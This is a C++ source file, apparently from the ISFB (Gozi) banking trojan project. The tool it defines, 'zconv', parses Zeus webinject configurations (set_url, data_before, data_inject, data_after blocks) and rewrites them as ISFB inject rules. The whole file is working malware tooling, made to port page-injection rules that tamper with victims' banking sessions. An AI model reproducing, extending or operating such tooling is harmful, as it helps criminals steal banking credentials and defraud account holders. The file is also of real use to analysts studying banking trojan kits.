//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: zconv.cpp
// $Revision: 276 $
// $Date: 2014-07-19 15:03:48 +0400 (Сб, 19 июл 2014) $
// description:
//	Zeus config file converter.

#include <stdio.h>
#include "..\common\common.h"

#define	szSetUrl		"set_url"
#define	szDataBefore	"data_before"
#define	szDataEnd		"data_end"
#define	szDataInject	"data_inject"
#define	szDataAfter		"data_after"
#define	szComment		";"

#define	szTmplUrl		"!REPLACE!!URL!%s\n"
#define	szTmplFrom		"!Replace from!%s"
#define	szTmplFor		"!Replace fo!%s%s"
#define	szAsterix		"*"
#define	szReplace		"**"


VOID OutUsage(VOID)
{
	printf("ZConv converter tool. Converts Z-specific configuration files to ISFB-specific text files.\n");
	printf(" USE: zconv <source file path> <result file path>\n");
}


static PCHAR CheckReplaceWildcards(
	PCHAR	pStr
	)
{
	PCHAR	pNewStr, pStr1;
	ULONG	Len = lstrlen(pStr);

	if (pNewStr = Alloc(Len + Len * (cstrlen(szReplace) - cstrlen(szAsterix)) + 1))
	{
		*pNewStr = 0;
		while(pStr1 = StrStr(pStr, szAsterix))
		{
			*pStr1 = 0;
			lstrcat(pNewStr, pStr);
			lstrcat(pNewStr, szReplace);
			pStr = pStr1 + cstrlen(szAsterix);
		}
		lstrcat(pNewStr, pStr);
	}
	else
		pNewStr = pStr;

	return(pNewStr);
}


static WINERROR CompleteRecord(
	FILE*	OutFile,
	PCHAR	pUrl,
	PCHAR	pBefore,
	PCHAR	pInject,
	PCHAR	pAfter
	)
{
	WINERROR Status = ERROR_NOT_ENOUGH_MEMORY;
	PCHAR	Buffer, fBuffer, tBuffer;
	ULONG	bSize, fSize, tSize;

	do
	{
		if (!((pUrl) && (pInject) && (pBefore || pAfter)))
		{
			Status = ERROR_INVALID_PARAMETER;
			break;
		}

		bSize = cstrlen(szTmplUrl) + lstrlen(pUrl);
		if (!(Buffer = Alloc(bSize + 1)))
			break;

		bSize = _snprintf(Buffer, bSize, szTmplUrl, pUrl);
		fputs(Buffer, OutFile);
		Free(Buffer);

		fSize = cstrlen(szTmplFrom);
		tSize = cstrlen(szTmplFor) + lstrlen(pInject);

		if (pBefore)
		{
			StrTrim(pBefore, "\r\n");
			fSize += lstrlen(pBefore);
			tSize += lstrlen(pBefore);
		}

		if (pAfter)
		{
			StrTrim(pAfter, "\r\n");
			fSize += lstrlen(pAfter);
			tSize += lstrlen(pAfter);
		}

		bSize = max(fSize, tSize) + 2*sizeof(_TCHAR);

		if (!(fBuffer = Alloc(bSize)))
			break;

		if (!(tBuffer = Alloc(bSize)))
			break;

		fSize = 0;
		tSize = 0;

		if (pBefore)
		{
			fSize += _snprintf(fBuffer, bSize - fSize, szTmplFrom, pBefore);
			tSize += _snprintf(tBuffer, bSize - tSize, szTmplFor, pBefore, pInject);

			if (pAfter)
			{
				lstrcat(fBuffer, szAsterix);
				fSize += cstrlen(szAsterix);
				lstrcat(fBuffer, pAfter);
				fSize += lstrlen(pAfter);

				lstrcat(tBuffer, pAfter);
				tSize += lstrlen(pAfter);
			}
		}
		else
		{
			ASSERT(pAfter);
			fSize = _snprintf(fBuffer, bSize - fSize, szTmplFrom, pAfter);
			tSize = _snprintf(tBuffer, bSize - tSize, szTmplFor, pInject, pAfter);
		}

		ASSERT(fSize < bSize);
		ASSERT(tSize < bSize);

		fwrite(fBuffer, fSize, 1, OutFile);
		fwrite(szCRLF, cstrlen(szCRLF), 1, OutFile);
		fwrite(tBuffer, tSize, 1, OutFile);
		fwrite(szCRLF, cstrlen(szCRLF), 1, OutFile);

		Free(fBuffer);
		Free(tBuffer);

		Status = NO_ERROR;
	} while(FALSE);

	return(Status);
}

#define STAGE_URL			1
#define	STAGE_DATA_BEFORE	2
#define	STAGE_DATA_INJECT	3
#define	STAGE_DATA_AFTER	4

WINERROR ZConvProcessFiles(FILE* SrcFile, FILE* DstFile)
{
	WINERROR Status = ERROR_NOT_ENOUGH_MEMORY;
	PCHAR	pLineBuffer, pStr, pChar;
	PCHAR	pUrl = NULL, pBefore = NULL, pInject = NULL, pAfter = NULL;
	ULONG	bSize, Stage = 0, Line = 0;
	LPSTREAM pStream;
	CHAR	c;

	if (CreateStreamOnHGlobal(NULL, TRUE, &pStream) == S_OK)
	{
		if (pLineBuffer = (PCHAR)Alloc(PAGE_SIZE))
		{
			while(fgets(pLineBuffer, PAGE_SIZE, SrcFile))
			{
				Line += 1;
				pStr = pLineBuffer;

				while((c = *pStr) && (c == ' ' || c == '\t'))
					pStr += 1;

				if (*pStr == 0 || *pStr == '\r' || *pStr == '\n' || pStr == StrStr(pStr, szComment))
					continue;

				if (StrStrI(pStr, szSetUrl) == pStr)
				{
					// New URL description
					if (pUrl)
					{
						// Have previouse URL ready
						Status = CompleteRecord(DstFile, pUrl, pBefore, pInject, pAfter);
	
						if (pBefore)
						{
							Free(pBefore);
							pBefore = NULL;
						}
						if (pAfter)
						{
							Free(pAfter);
							pAfter = NULL;
						}
						if (pInject)
						{
							Free(pInject);
							pInject = NULL;
						}

						Free(pUrl);

						if (Status != NO_ERROR)
						{
							printf("Error in line %u: expected \"data_end\"\n", Line);
							break;
						}
					}	// if (pUrl)

					pStr += cstrlen(szSetUrl);
					StrTrim(pStr, " \t");

					// Removing Z-code from the end of the URL
					if (pChar = StrChr(pStr, ' '))
						*pChar = 0;
					if (pChar = StrChr(pStr, '\t'))
						*pChar = 0;
				
					if (pUrl = Alloc(lstrlen(pStr) + sizeof(_TCHAR)))
						lstrcpy(pUrl, pStr);
					else
						break;

					Stage = STAGE_URL;
					continue;
				}	// if (StrStrI(pStr, szSetUrl) == pStr)

				if (StrStr(pStr, szDataEnd) == pStr)
				{
					PCHAR pBuffer = NULL;

					if (bSize = StreamGetLength(pStream))
					{
						if (pBuffer = Alloc(bSize + 1))
						{
							StreamGotoBegin(pStream);
							StreamRead(pStream, pBuffer, bSize, NULL);
							pBuffer[bSize] = 0;
						}
						StreamClear(pStream);
					}	// if (bSize = StreamGetLength(pStream))


					// Processing "data_end" tag
					if (Stage == STAGE_DATA_BEFORE)
					{
						if (pBuffer && ((pBefore = CheckReplaceWildcards(pBuffer)) != pBuffer))
							Free(pBuffer);
					}
					else if (Stage == STAGE_DATA_INJECT)
					{
						pInject = pBuffer;
					}
					else if (Stage == STAGE_DATA_AFTER)
					{
						if (pBuffer && ((pAfter = CheckReplaceWildcards(pBuffer)) != pBuffer))
							Free(pBuffer);
					}
					else
					{
						printf("Error in line %u: Unexpected \"data_end\" tag.\n", Line);
						if (pBuffer)
							Free(pBuffer);
						break;
					}
					continue;
				}	// if (StrStr(pStr, szDataEnd) == pStr)

				if (StrStr(pStr, szDataBefore) == pStr)
				{
					// Processing "data_before" tag
					if (Stage == STAGE_URL)
					{
						Stage = STAGE_DATA_BEFORE;
					}
					else if (Stage == STAGE_DATA_AFTER)
					{
						// Have previouse URL ready
						Status = CompleteRecord(DstFile, pUrl, pBefore, pInject, pAfter);
	
						if (pBefore)
						{
							Free(pBefore);
							pBefore = NULL;
						}
						if (pAfter)
						{
							Free(pAfter);
							pAfter = NULL;
						}
						if (pInject)
						{
							Free(pInject);
							pInject = NULL;
						}

						if (Status != NO_ERROR)
						{
							printf("Error in line %u: expected \"data_end\"\n", Line);
							break;
						}

						Stage = STAGE_DATA_BEFORE;
					}
					else
					{
						printf("Error in line %u: Unexpected \"data_before\" tag.\n", Line);
						break;
					}
					continue;
				}	// if (StrStr(pStr, szDataBefore) == pStr)

				if (StrStr(pStr, szDataInject) == pStr)
				{
					// Processing "data_before" tag
					if (Stage == STAGE_DATA_BEFORE)
					{
						Stage = STAGE_DATA_INJECT;
					}
					else
					{
						printf("Error in line %u: Unexpected \"data_inject\" tag.\n", Line);
						break;
					}
					continue;
				}	// if (StrStr(pStr, szDataBefore) == pStr)

				if (StrStr(pStr, szDataAfter) == pStr)
				{
					// Processing "data_before" tag
					if (Stage == STAGE_DATA_INJECT)
					{
						Stage = STAGE_DATA_AFTER;
					}
					else
					{
						printf("Error in line %u: Unexpected \"data_after\" tag.\n", Line);
						break;
					}
					continue;
				}	// if (StrStr(pStr, szDataBefore) == pStr)

				StreamWrite(pStream, pLineBuffer, lstrlen(pLineBuffer), NULL);
			}	// while(fgets(Str, MAX_PATH, File))

			if (feof(SrcFile))
			{
				if (pUrl)
				{
					// Have previouse URL ready
					Status = CompleteRecord(DstFile, pUrl, pBefore, pInject, pAfter);

					if (pBefore)
					{
						Free(pBefore);
						pBefore = NULL;
					}
					if (pAfter)
					{
						Free(pAfter);
						pAfter = NULL;
					}
					if (pInject)
					{
						Free(pInject);
						pInject = NULL;
					}

					Free(pUrl);

					if (Status != NO_ERROR)
					{
						printf("Error in line %u: expected \"data_end\"\n", Line);
					}
				}	// if (pUrl)
			}	// if (feof(SrcFile))

			Free(pLineBuffer);
		}	// if (Str = (PCHAR)Alloc(MAX_PATH))
		StreamRelease(pStream);
	}	// if (CreateStreamOnHGlobal(NULL, TRUE, &pStream) == S_OK)

	return(Status);
}

int _cdecl _tmain(int argc, _TCHAR* argv[])
{
	BOOL Ret = FALSE;

	if (argc > 2)
	{
		FILE *SrcFile, *DstFile;

		if (SrcFile = fopen(argv[1], "r"))
		{
			DeleteFile(argv[2]);
			if (DstFile = fopen(argv[2], "w"))
			{
				ZConvProcessFiles(SrcFile, DstFile);
				fclose(DstFile);
			}
			else
				printf("Unable to create result file: %s\n", argv[2]);

			fclose(SrcFile);
		}
		else
			printf("Unable to open source file: %s\n", argv[1]);
	}	// if (argc > 2)
	else
		OutUsage();


	return 0;
}
